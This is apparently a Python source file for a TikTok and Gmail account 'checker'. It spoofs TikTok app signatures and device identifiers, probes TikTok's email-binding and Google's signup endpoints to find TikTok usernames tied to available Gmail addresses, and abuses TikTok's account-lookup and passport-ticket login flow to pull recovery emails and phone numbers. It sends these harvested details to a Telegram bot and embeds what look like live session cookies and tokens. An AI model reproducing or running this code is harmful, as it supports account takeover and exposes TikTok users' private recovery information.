              params={'_rticket':rticket,'ab_version':'37.8.5','ac':'WIFI','ac2':'wifi','aid':'1233','app_language':'ar','app_name':'musical_ly','app_type':'normal','build_number':'37.8.5','carrier_region':'US','carrier_region_v2':'460','cdid':cdid,'channel':'googleplay','cronet_version':'75b93580_2024-11-28','device_brand':'rockchip','device_id':device_id,'device_platform':'android','device_type':'rk3588s_q','dpi':'320','fixed_mix_mode':'1','host_abi':'arm64-v8a','iid':iid,'is_pad':'0','language':'ar','last_install_time':'1745162892','locale':'ar','manifest_version_code':'2023708050','mix_mode':'1','op_region':'US','openudid':openudid,'os':'android','os_api':'29','os_version':'10','region':'IQ','request_tag_from':'h5','resolution':'720%2A1280','rrb':'%7B%7D','scene':'4','ssmix':'a','support_webview':'1','sys_region':'IQ','timezone_name':'Europe%2FAmsterdam','timezone_offset':'3600','ts':'1745163105','ttnet_version':'4.2.210.6-tiktok','uoo':'0','update_version_code':'2023708050','use_store_region_cookie':'1','version_code':'370805','version_name':'37.8.5','app_version':'32.9.5'}
              user_agent = (
                  f"com.zhiliaoapp.musically/{randrange(2_000_000_000, 3_000_000_000)} "
                  f"(Linux; U; Android {randrange(10, 16)}; "
                  f"{choice(['ar_AE', 'en_US', 'fr_FR', 'es_ES'])}; "
                  f"{choice(['phone', 'tablet', 'tv'])}; "
                  f"Build/UP1A.{randrange(200_000_000, 300_000_000)}; "
                  f"Cronet/{randrange(10_000_000, 20_000_000)} {randrange(2023, 2026)}-"
                  f"{randrange(1,13):02}-{randrange(1,29):02}; "
                  f"QuicVersion:{randrange(10_000_000, 20_000_000)} {randrange(2023, 2026)}-"
                  f"{randrange(1,13):02}-{randrange(1,29):02})"
              )

              try:
                  m=sign(params=urlencode(params),payload="",cookie="")
              except Exception as e:
                  print(e)


              headers = {
				'User-Agent': user_agent,
				'x-tt-passport-csrf-token':'deb4845f1062c1cf916902c6058604d1',
				'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
				'x-argus': m["x-argus"],
				'x-gorgon': m["x-gorgon"],
				'x-khronos': m["x-khronos"],
				'x-ladon': m["x-ladon"]}
              try:
                  url="https://api16-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/?passport-sdk-version=0&app_language=en&"
                  res = requests.post(url, params=params, headers=headers,data={"email":email},cookies=cookies).text
                  if 'Email is linked to another account. Unlink or try another email.'in res:
                      return True
                  else:
                      return False
              except:''
          except:''
  def check_gmail(self,email):
      while True:
        try:
          if '@' in email:email=email.split('@')[0]
          o=self.gg00()['tokens']

          TL=o['TL']
          __Host_GAPS=o['__Host-GAPS']
          at=o['at']
          hl=o['hl']
          s1=o['s1']
          cookies = {
              '__Host-GAPS': __Host_GAPS,
          }

          headers = {
              'accept': '*/*',
              'accept-language': 'en-US,en;q=0.9',
              'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
              'origin': 'https://accounts.google.com',
              'priority': 'u=1, i',
              'referer': 'https://accounts.google.com/',
              'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
              'sec-ch-ua-arch': '"x86"',
              'sec-ch-ua-bitness': '"64"',
              'sec-ch-ua-form-factors': '"Desktop"',
              'sec-ch-ua-full-version': '"112.0.5197.39"',
              'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.183", "Opera";v="112.0.5197.39"',
              'sec-ch-ua-mobile': '?0',
              'sec-ch-ua-model': '""',
              'sec-ch-ua-platform': '"Windows"',
              'sec-ch-ua-platform-version': '"10.0.0"',
              'sec-ch-ua-wow64': '?0',
              'sec-fetch-dest': 'empty',
              'sec-fetch-mode': 'cors',
              'sec-fetch-site': 'same-origin',
              'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
              'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
              'x-goog-ext-391502476-jspb': '["{}"]'.format(s1),
              'x-same-domain': '1',
          }

          params = {
              'rpcids': 'NHJMOd',
              'source-path': '/lifecycle/steps/signup/username',
              'f.sid': '-794764349027196993',
              'bl': 'boq_identity-account-creation-evolution-ui_20240731.08_p0',
              'hl': hl,
              'TL': TL,
              '_reqid': '648808',
              'rt': 'c',
          }

          data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2C1%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C1%2C8420%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(email,at)

          response = post(
              'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
              params=params,
              cookies=cookies,
              headers=headers,
              data=data,
          ).text
          if 'password' in response:
            return True
          else:
            return False
        except Exception as e:''
  def info(self,username):
    try:
      try:
          # This part needs to handle file operations carefully in a multi-threaded environment
          # For simplicity, removed direct file writing here, assuming self.hits will be processed later
          # if username in open('luffy','r').read().splitlines():
          #     return
          # with open('luffy.txt','a') as a:
          #       a.write(f'{luffy}\n')
          pass
      except:
          # with open('hits.txt','a') as a:
          #       a.write(f'{username}\n')
          pass
      self.hits.append(username)
      inf=self.information(username)
      #mn=self.em_num(username) # mn is not defined anywhere, removed for now
 
    except Exception as e:
      print(f"Error in info function for {username}: {e}")

            
      
          
          

  def get_country_info(self, country_code):
      # This function seems to be missing its implementation to fetch country data.
      # For now, it will return empty strings.
      # You would typically have a dictionary or API call to get country name and flag.
      # Example: country_data = {"US": {"name": "United States", "flag": "🇺🇸"}}
      return "", "" # Placeholder

  def information(self,username):
    try:
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
            }

        try:
            tikinfo = get(f'https://www.tiktok.com/@{username}', headers=headers).text
            info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
            try:
                name = str(info.split('nickname":"')[1]).split('",')[0]
            except:
                name = ""
            try:
                followers = str(info.split('followerCount":')[1]).split(',"')[0]
            except:
                followers = ""
            try:
                following = str(info.split('followingCount":')[1]).split(',"')[0]
            except:
                following = ""
            try:
                like = str(info.split('heart":')[1]).split(',"')[0]
            except:
                like = ""
            try:
                video = str(info.split('videoCount":')[1]).split(',"')[0]
            except:
                video = ""
            try:
                id = str(info.split('id":"')[1]).split('",')[0]
            except:
                id = ""
            try:
                bio = str(info.split('signature":"')[1]).split('",')[0]
            except:
                bio = ""
            try:
                country = str(info.split('region":"')[1]).split('",')[0]
            except:
                country = ""
            try:
                private = str(info.split('privateAccount":')[1]).split(',"')[0]
            except:
                private = ""
            try:
               country_name, flag = self.get_country_info(country)
            except:
                country_name, flag = '',''
            return {
                "name": name,
                "username": username,
                "followers": followers,
                "following": following,
                "like": like,
                "video": video,
                "private": private,
                "id": id,
                "bio": bio,
                "country_name": country_name,
                "flag":flag,
                "BY": "@DDDBB4"
            }
        except:
          return {
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "country_name": "",
              "flag":"",
              "BY": "@DDDBB4"
          }
    except :
        return {
              "name": '',
              "username": '',
              "followers": '',
              "following": '',
              "like": '',
              "video": '',
              "private": '',
              "id": '',
              "bio": '',
              "country_name": "",
              "flag":"",
              "BY": "@DDDBB4"
          }
  def get_following(self,username,id):
      while True:
                try:
                      usernames=[]
                      uid = "".join(choice('1234567890')for i in range(18))
                      url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&sec_user_id={username}=1694591114&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694591805386&app_language=ar&current_region=IQ&app_type=normal&iid=7278211504247604997&channel=googleplay&device_type=Infinix%20X692&language=ar&locale=ar&resolution=720*1464&openudid=b32f27a32b0e1880&update_version_code=2019081160&sys_region=EG&os_api=29&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7149927891131893254&pass-route=1&mcc_mnc=41820&os_version=10&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=Infinix&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694591805'
                      he = {
                          'Host': 'api2-19-h2.musical.ly', 'Connection': 'keep-alive',
                          'Cookie': 'passport_csrf_token_default=621d779700f3a5e1c16e847f556de1cf; odin_tt=866be507765a947edcd21b15da40c33f3ec663cb56a5b8f17c4cbc59501c8cdc11443e8b5f7613a3e1eeeaf9c5c5c626ba9d9371661dafbd1715044506eea452becf1c641da7911b51d360267627beb1; d_ticket=b74d11501bf12e69ef3a14403dd9b53a6e0ef; sid_guard=75cd6d4793949f0c1fbffbbf214bd8f3%7C1694590737%7C15552000%7CMon%2C+11-Mar-2024+07%3A38%3A57+GMT; uid_tt=f24ebc81f26b3bbb139120e2a1fd84079edcdd9f0ef437207295174d90d81ac2; sid_tt=75cd6d4793949f0c1fbffbbf214bd8f3; sessionid=75cd6d4793949f0c1fbffbbf214bd8f3; store-idc=maliva; store-country-code=iq; store-country-code-src=uid ', 'Accept-Encoding': 'gzip ', 'X-Tt-Token': '0375cd6d4793949f0c1fbffbbf214bd8f30164a11d6f25e25bbf64cd4eeb57d19e038d0cba33388bc9e6366339c6766e38542b539e748b10032429083916186c8e084307f982d3168df208b7c810609e2e556ddd14c2cada22858b2255f9b065579de-CkA3YmIxYTA0NmYzYWI4NTFiOGI1ZThmYjMzYTk3ODMxOTVkMTU1NWVmMjY5NDQ5Yzk2OGEyZWQ2YzBlYWI0MWQx-2.0.0',
                          'sdk-version': '1',
                          'x-tt-trace-id': '00-cb0d0c7cf24f0f1ba8d51e896bf5ac43-cb0d0c7cf24f0f1b-01',
                          'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 10; ar_EG; Infinix X692; Build/QP1A.190711.020; Cronet/58.0.2991.0)',
                          'X-Khronos': '1694591805',
                          'XGorgon':'83005ff000008e4a029840116a6f3d461d9c1aaef0c6f5e6c2ed'}
                      re = get(url,headers=he).json()['followings']
                      for user in re:
                            username=(user['unique_id'])
                            follower_count=int(user['follower_count'])
                            if '_' not in username:
                                    usernames.append(username)
                      return usernames
                except:return []

  def home(self,username):
    while True:
      try:
          # Themed output for checking progress
          sys.stdout.write(
              f'''\r{Colors.CYAN}╔═════════════════════════════════════╗\n'''
              f'''{Colors.CYAN}║ {Colors.BRIGHT_GREEN}Good Gmail: {self.good_gmail:<5} {Colors.BRIGHT_RED}Bad TikTok: {self.bad_tiktok:<5}{Colors.CYAN} ║\n'''
              f'''{Colors.CYAN}║ {Colors.BRIGHT_RED}Bad Gmail:  {self.bad_gmail:<5} {Colors.BRIGHT_GREEN}Good TikTok: {self.good_tiktok:<5}{Colors.CYAN}║\n'''
              f'''{Colors.CYAN}╚═════════════════════════════════════╝{Colors.RESET}'''
          )
          sys.stdout.flush() # Ensure immediate update of the console line

          email=username+'@gmail.com'
          if True == self.check_linked(email):
              self.good_tiktok+=1
              if True == self.check_gmail(username):
                  self.good_gmail+=1
                  self.info(username)
                  # If a good_gmail is found, run the rest.py logic for this username
                  print(f"\n{Colors.BRIGHT_GREEN}Found good_gmail: {username}. Running TikTok rest check...{Colors.RESET}")
                  tiktok_rest_checker = TikTok(username, self.id, self.token) # Pass id and token
                  tiktok_rest_checker.check_rest()
              else:self.bad_gmail+=1
          else:self.bad_tiktok+=1

          # Re-write the themed output after each check
          sys.stdout.write(
              f'''\r{Colors.CYAN}╔═════════════════════════════════════╗\n'''
              f'''{Colors.CYAN}║ {Colors.BRIGHT_GREEN}Good Gmail: {self.good_gmail:<5} {Colors.BRIGHT_RED}Bad TikTok: {self.bad_tiktok:<5}{Colors.CYAN} ║\n'''
              f'''{Colors.CYAN}║ {Colors.BRIGHT_RED}Bad Gmail:  {self.bad_gmail:<5} {Colors.BRIGHT_GREEN}Good TikTok: {self.good_tiktok:<5}{Colors.CYAN}║\n'''
              f'''{Colors.CYAN}╚═════════════════════════════════════╝{Colors.RESET}'''
          )
          sys.stdout.flush()
          return
      except Exception as e:
          print(f"{Colors.BRIGHT_RED}Error in home function for {username}: {e}{Colors.RESET}")
          # Optionally send error to Telegram if critical
          # self.send_to_telegram(f"Error in home for {username}: {e}")


# --- Class from rest.py (modified to accept token and id, and integrate username) ---
class TikTok:
	def __init__(self,user, telegram_id, telegram_token): # Added telegram_id and telegram_token as parameters
		self.data={}
		self.user=user
		self.telegram_id = telegram_id # Storing the telegram id
		self.telegram_token = telegram_token # Storing the telegram token

	def send_to_telegram(self, message):
		"""Sends a message to the specified Telegram chat."""
		try:
			telegram_url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
			payload = {
				"chat_id": self.telegram_id,
				"text": message
			}
			requests.post(telegram_url, json=payload)
			print(f"{Colors.BRIGHT_GREEN}Information sent to Telegram successfully.{Colors.RESET}")
		except Exception as e:
			print(f"{Colors.BRIGHT_RED}Failed to send information to Telegram: {e}{Colors.RESET}")

	def check_rest(self):
		cog = secrets.token_hex(6*2+4)
		cookies ={
		      "passport_csrf_token": cog,
		      "passport_csrf_token_default": cog
		    }


		s = Session()
		s.cookies.update(cookies)
		url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/username/"

		params = {
		  'request_tag_from': "h5",
		  'fixed_mix_mode': "1",
		  'mix_mode': "1",
		  'account_param': self.user,
		  'scene': "4",
		  'device_platform': "android",
		  'os': "android",
		  'ssmix': "a",
		  '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
		  'cdid': str(uuid.uuid4()),
		  'channel': "googleplay",
		  'aid': "1233",
		  'app_name': "musical_ly",
		  'version_code': "370805",
		  'version_name': "37.8.5",
		  'manifest_version_code': "2023708050",
		  'update_version_code': "2023708050",
		  'ab_version': "37.8.5",
		  'resolution': "720*1448",
		  'dpi': "320",
		  'device_type': "RMX3269",
		  'device_brand': "realme",
		  'language': "ar",
		  'os_api': "30",
		  'os_version': "11",
		  'ac': "wifi",
		  'is_pad': "0",
		  'current_region': "IQ",
		  'app_type': "normal",
		  'sys_region': "IQ",
		  'last_install_time': "1744847306",
		  'mcc_mnc': "41840",
		  'timezone_name': "Asia%2FBaghdad",
		  'carrier_region_v2': "418",
		  'residence': "IQ",
		  'app_language': "ar",
		  'carrier_region': "IQ",
		  'timezone_offset': "10800",
		  'host_abi': "arm64-v8a",
		  'locale': "ar",
		  'ac2': "wifi",
		  'uoo': "0",
		  'op_region': "IQ",
		  'build_number': "37.8.5",
		  'region': "IQ",
		  'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
		  'iid': str(random.randint(1, 10**19)),
		  'device_id': str(random.randint(1, 10**19)),
		  'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
		  'support_webview': "1",
		  'cronet_version': "75b93580_2024-11-28",
		  'ttnet_version': "4.2.210.6-tiktok",
		  'use_store_region_cookie': "1",
		  'app_version':"37.8.5"
		}
		m=SignerPy.sign(params=params,cookie=cookies)
		headers = {
		  'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
		  'Accept': "application/json, text/plain, */*",
		  'content-length': "0",
		  'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",

		  'x-tt-passport-csrf-token': cog,

		  'content-type': "application/x-www-form-urlencoded",
		     'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
		}

		response = s.post(url, params=params, headers=headers)
#		print(response.url)
#		print(response.headers)
#		print(response.cookies.get_dict())
		#print(response.json())
		try:

			p=response.json()['data']['accounts'][0]['passport_ticket']
#			print(p)
			ug=response.json()['data']['accounts'][0]['username']
			params = {
		  'request_tag_from': "h5",
		  'fixed_mix_mode': "1",
		  'mix_mode': "1",
		  'account_param': self.user,
		  'passport_ticket': p,
		  'scene': "4",
		  'device_platform': "android",
		  'os': "android",
		  'ssmix': "a",
		  '_rticket': params['_rticket'],
		  'cdid': params['cdid'],
		  'channel': "googleplay",
		  'aid': "1233",
		  'app_name': "musical_ly",
		  'version_code': "370805",
		  'version_name': "37.8.5",
		  'manifest_version_code': "2023708050",
		  'update_version_code': "2023708050",
		  'ab_version': "37.8.5",
		  'resolution': "720*1448",
		  'dpi': "320",
		  'device_type': "RMX3269",
		  'device_brand': "realme",
		  'language': "ar",
		  'os_api': "30",
		  'os_version': "11",
		  'ac': "wifi",
		  'is_pad': "0",
		  'current_region': "IQ",
		  'app_type': "normal",
		  'sys_region': "IQ",
		  'last_install_time': "1744847306",
		  'mcc_mnc': "41840",
		  'timezone_name': "Asia%2FBaghdad",
		  'carrier_region_v2': "418",
		  'residence': "IQ",
		  'app_language': "ar",
		  'carrier_region': "IQ",
		  'timezone_offset': "10800",
		  'host_abi': "arm64-v8a",
		  'locale': "ar",
		  'ac2': "wifi",
		  'uoo': "0",
		  'op_region': "IQ",
		  'build_number': "37.8.5",
		  'region': "IQ",
		  'ts': params['ts'],
		  'iid': params['iid'],
		  'device_id': params['device_id'],
		  'openudid': params['openudid'],
		  'support_webview': "1",
		  'cronet_version': "75b93580_2024-11-28",
		  'ttnet_version': "4.2.210.6-tiktok",
		  'use_store_region_cookie': "1",
		  'app_version':"37.8.5"
		}
			self.data.update({'username':ug})

			m=SignerPy.sign(params=params,cookie=cookies)
			headers = {
		  'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 11; ar; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:75b93580 2024-11-28 QuicVersion:ef6c341e 2024-11-14)",
		  'Accept': "application/json, text/plain, */*",
		  'content-length': "0",
		  'x-tt-referer': "https://inapp.tiktokv.com/ucenter_web/account_lookup_tool",

		  'x-tt-passport-csrf-token': headers['x-tt-passport-csrf-token'],

		  'content-type': "application/x-www-form-urlencoded",
		     'x-argus': m["x-argus"],  'x-gorgon':m["x-gorgon"],'x-khronos': m["x-khronos"],'x-ladon':m["x-ladon"],
		}
			url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"

			response = s.post(url, params=params, headers=headers)
			# print(response.headers)
			# print(response.json())
			kj=json.loads(response.headers["x-tt-verify-idv-decision-conf"])
			# print(kj)
			# print(response.url)

			# print(response.cookies.get_dict())
			for uu in kj['extra']:
#				print(uu)
				oo=uu['info']
				if '@' in oo:
					k=oo
					jj=k.split('@')[1]
					self.data.update({'rest':k})
					kk=k.split('@')[0]
					hu=self.user[0]
					gf=self.user[-1]
					y=kk[0]
					iy=kk[-1]
					if hu==y and gf==iy:
						headers={'User-Agent':'Mozilla/50 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'}
						re=get(f'https://www.tiktok.com/@{self.user}', headers=headers).text
						followers=str(re).split(':{"followerCount":')[1].split(',')[0]
						self.data.update({'username':self.user,'followers':followers,'email':self.user+jj})
					else:""

				elif '+' in oo:
					self.data.update({'number':oo})

				else:
					self.data.update({'Telgrame @as_wqt ':oo})

			print(f"{Colors.BRIGHT_GREEN}TikTok Rest Check Results:{Colors.RESET}")
			for key, value in self.data.items():
				print(f"{Colors.CYAN}{key}: {Colors.YELLOW}{value}{Colors.RESET}")
			# Send data to Telegram
			telegram_message = "TikTok Account ALI BASSAM:\n"
			for key, value in self.data.items():
				telegram_message += f"{key}: {value}\n"
			self.send_to_telegram(telegram_message)


		except Exception as e:
			print(f"{Colors.BRIGHT_RED}Error in TikTok rest check: {e}{Colors.RESET}")
			self.send_to_telegram(f"An error occurred during TikTok rest check for {self.user}: {e}") # Send error to Telegram

# Main execution part
if __name__ == "__main__":
    checker = TikTokChecker()